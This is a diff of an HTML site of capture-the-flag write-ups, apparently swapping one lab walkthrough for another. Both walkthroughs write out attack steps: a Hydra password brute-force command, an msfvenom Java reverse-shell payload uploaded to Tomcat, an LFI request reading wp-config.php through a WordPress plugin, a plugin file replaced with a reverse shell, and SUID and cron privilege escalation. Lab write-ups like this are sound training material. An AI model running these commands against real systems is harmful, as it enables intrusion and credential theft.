-<span class="w">    </span><span class="o">[</span><span class="m">10</span>:14:03<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>290B<span class="w">  </span>-<span class="w"> </span>/.htm
-<span class="w">    </span><span class="o">[</span><span class="m">10</span>:14:03<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>299B<span class="w">  </span>-<span class="w"> </span>/.htaccessOLD2<span class="w">                                   </span>
-<span class="w">    </span><span class="o">[</span><span class="m">10</span>:14:03<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>291B<span class="w">  </span>-<span class="w"> </span>/.html
-<span class="w">    </span><span class="o">[</span><span class="m">10</span>:14:03<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>300B<span class="w">  </span>-<span class="w"> </span>/.htpasswd_test
-<span class="w">    </span><span class="o">[</span><span class="m">10</span>:14:03<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>296B<span class="w">  </span>-<span class="w"> </span>/.htpasswds
-<span class="w">    </span><span class="o">[</span><span class="m">10</span>:14:03<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>297B<span class="w">  </span>-<span class="w"> </span>/.httr-oauth
-<span class="w">    </span><span class="o">[</span><span class="m">10</span>:14:36<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">  </span>168B<span class="w">  </span>-<span class="w"> </span>/index.html<span class="w">                                       </span>
-<span class="hll"><span class="w">    </span><span class="o">[</span><span class="m">10</span>:14:47<span class="o">]</span><span class="w"> </span><span class="m">401</span><span class="w"> </span>-<span class="w">  </span>458B<span class="w">  </span>-<span class="w"> </span>/protected/data/<span class="w">                                  </span>
-</span><span class="hll"><span class="w">    </span><span class="o">[</span><span class="m">10</span>:14:47<span class="o">]</span><span class="w"> </span><span class="m">401</span><span class="w"> </span>-<span class="w">  </span>458B<span class="w">  </span>-<span class="w"> </span>/protected/runtime/
-</span><span class="hll"><span class="w">    </span><span class="o">[</span><span class="m">10</span>:14:47<span class="o">]</span><span class="w"> </span><span class="m">301</span><span class="w"> </span>-<span class="w">  </span>298B<span class="w"> </span>-<span class="w">  </span>/guidelines
-</span><span class="w">    </span><span class="o">[</span><span class="m">10</span>:14:49<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>299B<span class="w">  </span>-<span class="w"> </span>/server-status<span class="w">                                    </span>
-<span class="w">    </span><span class="o">[</span><span class="m">10</span>:14:49<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>300B<span class="w">  </span>-<span class="w"> </span>/server-status/
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span></pre></div></td><td class="code"><div><pre><span></span><code>root:x:0:0:root:/root:/bin/bash<span class="w"> </span>
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<span class="w"> </span>
+bin:x:2:2:bin:/bin:/usr/sbin/nologin<span class="w"> </span>
+sys:x:3:3:sys:/dev:/usr/sbin/nologin<span class="w"> </span>
+sync:x:4:65534:sync:/bin:/bin/sync<span class="w"> </span>
+games:x:5:60:games:/usr/games:/usr/sbin/nologin<span class="w"> </span>
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<span class="w"> </span>
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<span class="w"> </span>
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<span class="w"> </span>
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<span class="w"> </span>
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<span class="w"> </span>
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<span class="w"> </span>
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<span class="w"> </span>
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<span class="w"> </span>
+list:x:38:38:Mailing<span class="w"> </span>List<span class="w"> </span>Manager:/var/list:/usr/sbin/nologin<span class="w"> </span>
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<span class="w"> </span>
+Bug-Reporting<span class="w"> </span>System<span class="w"> </span><span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin<span class="w"> </span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<span class="w"> </span>
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin<span class="w"> </span>
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin<span class="w"> </span>
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin<span class="w"> </span>
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin<span class="w"> </span>
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin<span class="w"> </span>
+pollinate:x:109:1::/var/cache/pollinate:/bin/false<span class="w"> </span>
+<span class="hll">elyana:x:1000:1000:Elyana:/home/elyana:/bin/bash<span class="w"> </span>
+</span>mysql:x:110:113:MySQL<span class="w"> </span>Server,,,:/nonexistent:/bin/false<span class="w"> </span>
+sshd:x:112:65534::/run/sshd:/usr/sbin/nologin<span class="w"> </span>
+ftp:x:111:115:ftp<span class="w"> </span>daemon,,,:/srv/ftp:/usr/sbin/nologin<span class="w"> </span>
 </code></pre></div></td></tr></table></div>
-<h2 id="exploiting-guidelines-page"><b>Exploiting '/guidelines' page</b><a class="headerlink" href="#exploiting-guidelines-page" title="Permanent link">&para;</a></h2>
-<p>After running the dirsearch script, I was able to identify two promising directories that could lead to further leads, namely <code>protected</code> and <code>guidelines</code>. The former sounded highly secured, but to my surprise, it was not. While I was filling out the question, I decided to check out the <code>/guidelines</code> page, and found a username called <code>bob</code>.</p>
-<p><img id="image2" /></p>
-<p>Leveraging this discovery, I was able to brute force Bob's password using Hydra, which gave me access to the <code>protected</code> directory. It was a simple HTTP Basic Authorization Request which can be brute forced with the following command:</p>
-<div class="admonition tip">
-<p class="admonition-title">Hydra Command</p>
-<p><p id="desc" style="font-size:15px">hydra $IP -l bob -P ~/rockyou.txt http-get /protected -V</p></p>
-</div>
-<p><img id="image3" /></p>
-<p>I successfully obtained Bob's login credentials, and used them to access the page that I had discovered earlier.</p>
-<h2 id="exploiting-apache-tomcat-with-harvested-credentials"><b>Exploiting Apache Tomcat with Harvested Credentials</b><a class="headerlink" href="#exploiting-apache-tomcat-with-harvested-credentials" title="Permanent link">&para;</a></h2>
-<p>When I logged in, I discovered that the Authorization mechanism used for the Tomcat Service and the <code>/protected</code> directory were the same. </p>
-<p><img id="image4" /></p>
-<p>This allowed me to reuse the credentials that I had previously harvested. With access granted, I uploaded a Java WAR file to the manager and made a reverse shell from it.</p>
-<div class="admonition bug">
-<p class="admonition-title">Msfvenom Payload</p>
-<p><span>msfvenom -p java/shell_reverse_tcp lhost=10.17.3.217 lport=5432 -f war -o shell.war</span></p>
-</div>
-<p><img id="image5" /></p>
-<p>Also, I made a listener, before I accessed <ins class="critic">http://10.10.4.144:1234/shell/</ins> giving me the shell.</p>
-<h2 id="gaining-root-access"><b>Gaining Root access</b><a class="headerlink" href="#gaining-root-access" title="Permanent link">&para;</a></h2>
-<p>Surprisingly, I was granted <code>root</code> access, rather than the expected <code>www-data</code> shell. Easy-Peasy</p>
-<div class="highlight"><pre><span></span><code>root@ip-10-10-4-144:/#<span class="w"> </span>cat<span class="w"> </span>root/*
-cat<span class="w"> </span>root/*
-<del class="critic">REDACTED</del>
-cat:<span class="w"> </span>root/snap:<span class="w"> </span>Is<span class="w"> </span>a<span class="w"> </span>directory
+<p>This confirmed the user <strong>elyana</strong>.</p>
+<p>I then attempted to retrieve the <code>wp-config.php</code> file. However, I didn't receive a response.</p>
+<div class="admonition failure">
+<p class="admonition-title">Failed</p>
+<div class="highlight"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/www/html/wordpress/wp-config.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
 </code></pre></div>
+</div>
+<p>Later, I discovered that I needed to encode PHP files into text form in Base64:</p>
 <div class="admonition success">
-<p><span>Peace-out!</span></p>
+<p class="admonition-title">Succeeded</p>
+<div class="highlight"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=file:///var/www/html/wordpress/wp-config.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</code></pre></div>
+</div>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="cp">&lt;?php</span>
+
+<span class="sd">/** MySQL database username */</span>
+<span class="hll"><span class="nb">define</span><span class="p">(</span> <span class="s1">&#39;DB_USER&#39;</span><span class="p">,</span> <span class="s1">&#39;elyana&#39;</span> <span class="p">);</span>
+</span>
+<span class="sd">/** MySQL database password */</span>
+<span class="hll"><span class="nb">define</span><span class="p">(</span> <span class="s1">&#39;DB_PASSWORD&#39;</span><span class="p">,</span> <span class="s1">&#39;<del class="critic">REDACTED</del>&#39;</span> <span class="p">);</span>
+</span>
+<span class="sd">/** MySQL hostname */</span>
+<span class="nb">define</span><span class="p">(</span> <span class="s1">&#39;DB_HOST&#39;</span><span class="p">,</span> <span class="s1">&#39;localhost&#39;</span> <span class="p">);</span>
+
+<span class="sd">/** Database Charset to use in creating database tables. */</span>
+<span class="nb">define</span><span class="p">(</span> <span class="s1">&#39;DB_CHARSET&#39;</span><span class="p">,</span> <span class="s1">&#39;utf8mb4&#39;</span> <span class="p">);</span>
+
+<span class="sd">/** The Database Collate type. Don&#39;t change this if in doubt. */</span>
+<span class="nb">define</span><span class="p">(</span> <span class="s1">&#39;DB_COLLATE&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span> <span class="p">);</span>
+
+<span class="nx">wordpress</span><span class="p">;</span>
+<span class="nb">define</span><span class="p">(</span> <span class="s1">&#39;WP_SITEURL&#39;</span><span class="p">,</span> <span class="s1">&#39;http://&#39;</span> <span class="o">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;/wordpress&#39;</span><span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span> <span class="s1">&#39;WP_HOME&#39;</span><span class="p">,</span> <span class="s1">&#39;http://&#39;</span> <span class="o">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;/wordpress&#39;</span><span class="p">);</span>
+</code></pre></div></td></tr></table></div>
+<p>Although I attempted to reuse the SQL password for the SSH service, it didn't work. Eventually, I logged in as <strong>elyana</strong> in Wordpress and changed the content of the <strong>Reflex Gallery plugin</strong> in <strong><code>reflex-gallery/lib/gallery-class.php</code></strong> with a reverse shell. </p>
+<p><img id="image4" />
+<img id="image5" /></p>
+<div class="admonition abstract">
+<p class="admonition-title">Note</p>
+<p><span>Note: You need to deactivate the reflex-gallery plugin first to change the PHP file, then activate it again.</span></p>
+</div>
+<p>When <strong><code>/wordpress/wp-content/plugins/reflex-gallery/lib/gallery-class.php</code></strong> was accessed on browser, I obtained a shell with the <code>www-data</code> user.</p>
+<p><img id="image6" /></p>
+<h2 id="privilege-escalation"><b>Privilege Escalation</b><a class="headerlink" href="#privilege-escalation" title="Permanent link">&para;</a></h2>
+<h3 id="gaining-user-access-elyana"><b>Gaining User access (Elyana)</b><a class="headerlink" href="#gaining-user-access-elyana" title="Permanent link">&para;</a></h3>
+<div class="admonition warning">
+<div class="tabbed-set tabbed-alternate" data-tabs="1:2"><input checked="checked" id="__tabbed_1_1" name="__tabbed_1" type="radio" /><input id="__tabbed_1_2" name="__tabbed_1" type="radio" /><div class="tabbed-labels"><label for="__tabbed_1_1">Private.txt</label><label for="__tabbed_1_2">Chmod SUID</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<p><span>As soon as I got the shell, I checked to see if <code>www-data</code> could read <strong>user.txt</strong>, but it was not possible. However, there was a hint file that said,</span> </p>
+<div class="highlight"><pre><span></span><code><span class="s2">&quot;Elyana&#39;s user password is hidden in the system. Find it ;)&quot;</span>
+</code></pre></div>
+<p><span>I searched for files owned by elyana using the command and found a <strong>private.txt</strong> file in the <strong>/etc/</strong> folder.</span></p>
+<div class="highlight"><pre><span></span><code><span class="err">find</span> <span class="err">/</span> <span class="err">-user</span> <span class="err">elyana</span> <span class="err">2</span><span class="k">&gt;</span><span class="err">/dev/null</span> 
+</code></pre></div>
+<p><span>The file contained the username and password for elyana's user account. Using SSH, I escalated my privileges to elyana.</span></p>
+</div>
+<div class="tabbed-block">
+<p><span>Then, I checked all SUID set bit binaries to see what I could exploit, and ran the command:</span></p>
+<div class="highlight"><pre><span></span><code><span class="err">find</span> <span class="err">/</span> <span class="err">-user</span> <span class="err">root</span> <span class="err">-perm</span> <span class="err">/4000</span> <span class="err">-ls</span> <span class="err">2</span><span class="k">&gt;</span><span class="err">/dev/null</span>
+</code></pre></div>
+<p><span>This showed me that the following binaries were available in SUID set:</span></p>
+<div class="highlight"><pre><span></span><code><span class="err">-rwsr-sr-x</span> <span class="err">1</span> <span class="err">root</span> <span class="err">root</span> <span class="err">1.1M</span> <span class="err">Jun</span> <span class="err">6</span> <span class="err">2019</span> <span class="err">/bin/bash</span>
+<span class="err">-rwsr-sr-x</span> <span class="err">1</span> <span class="err">root</span> <span class="err">root</span> <span class="err">59K</span> <span class="err">Jan</span> <span class="err">18</span> <span class="err">2018</span> <span class="err">/bin/chmod</span>
+<span class="err">-rwsr-sr-x</span> <span class="err">1</span> <span class="err">root</span> <span class="err">root</span> <span class="err">392K</span> <span class="err">Apr</span> <span class="err">4</span> <span class="err">2018</span> <span class="err">/usr/bin/socat</span>
+</code></pre></div>
+<p><span>Since my goal was to escalate and obtain <strong>user.txt</strong>, I focused on using<strong><code>/bin/chmod</code></strong>, which can be run as root.</span></p>
+<p><img id="image7" /></p>
+<div class="admonition info">
+<p><span><strong>Note:</strong> This method actually runs as a root. But, this is one of the possibility to get user.txt from www-data.</span></p>
+</div>
+</div>
+</div>
+</div>
+</div>
+<h3 id="gaining-root-access"><b>Gaining Root access</b><a class="headerlink" href="#gaining-root-access" title="Permanent link">&para;</a></h3>
+<p>You can escalate your privilege to root in different ways:</p>
+<div class="admonition bug">
+<div class="tabbed-set tabbed-alternate" data-tabs="2:2"><input checked="checked" id="__tabbed_2_1" name="__tabbed_2" type="radio" /><input id="__tabbed_2_2" name="__tabbed_2" type="radio" /><div class="tabbed-labels"><label for="__tabbed_2_1">CRON job</label><label for="__tabbed_2_2">Bash Binary</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<p><span>After noticing a cronjob that ran <strong><code>/var/backups/script.sh</code></strong>, I realized that I had all the permissions as <code>elyana</code>. </span></p>
+<p><img id="image8" /></p>
+<p><span>So, I changed the code to:</span></p>
+<div class="highlight"><pre><span></span><code><span class="err">cp</span> <span class="err">/root/root.txt</span> <span class="err">/tmp/root.txt.</span> 
+</code></pre></div>
+</div>
+<div class="tabbed-block">
+<p><span>We already knew about the SUID binaries, including <strong>/bin/bash</strong>, <strong>/bin/chmod</strong>, and <strong>/usr/bin/socat</strong>. I decided to check with the bash binary by running the following command:</span></p>
+<p><div class="highlight"><pre><span></span><code><span class="err">/bin/bash</span> <span class="err">-p</span>
+</code></pre></div>
+<span>This command allowed me to get root access. What else can I ask? </span></p>
+<p><span>I then tried to read the root.txt file located at <strong><code>/root/root.txt</code></strong> </span></p>
+<div class="admonition info">
+<p><span><strong>Note:</strong> /bin/bash can also be executed by <strong><code>www-data</code></strong>. So you get root directly from <code>www-data</code> bypassing <code>elyana</code></span></p>
+</div>
+</div>
+</div>
+</div>
 </div>
 <script>
 
 // JSON object
 const data = {
-    "desc": "Practise using tools such as dirbuster, hydra, nmap, nikto and metasploit",
-    "ip":  "10.10.4.144",
-    "ports": "22/tcp,ssh,OpenSSH 7.2p2 Ubuntu;80/tcp,http,Apache httpd 2.4.18;1234/tcp,http,Apache Tomcat/Coyote JSP engine 1.1;8009/tcp,ajp13,Apache Jserv (Protocol v1.3)",
+    "desc": "This is a fun box where you will get to exploit the system in several ways. Few intended and unintended paths to getting user and root access.",
+    "ip":  "10.10.245.161",
+    "ports": "21/tcp,ftp,vsftpd 3.0.3;22/tcp,ssh,OpenSSH 7.6p1 Ubuntu 4ubuntu0.3;80/tcp,http,Apache httpd 2.4.29",
     "difficulty":"easy",
-    "id": "3"
+    "id": "6"
 }
 
 
@@ -1027,7 +1166,7 @@ updateHTML();
       <nav class="md-footer__inner md-grid" aria-label="Footer" >
         
           
-          <a href="../ARcHanG3l/" class="md-footer__link md-footer__link--prev" aria-label="Previous: ARcHanG3l" rel="prev">
+          <a href="../Tech_Supp0rt/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Tech_Supp0rt:1" rel="prev">
             <div class="md-footer__button md-icon">
               <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
             </div>
@@ -1036,26 +1175,11 @@ updateHTML();
                 <span class="md-footer__direction">
                   Previous
                 </span>
-                ARcHanG3l
+                Tech_Supp0rt:1
               </div>
             </div>
           </a>
         
-        
-          
-          <a href="../CVE-2021-29447/" class="md-footer__link md-footer__link--next" aria-label="Next: Wordpress CVE" rel="next">
-            <div class="md-footer__title">
-              <div class="md-ellipsis">
-                <span class="md-footer__direction">
-                  Next
-                </span>
-                Wordpress CVE
-              </div>
-            </div>
-            <div class="md-footer__button md-icon">
-              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
-            </div>
-          </a>
         
       </nav>
     
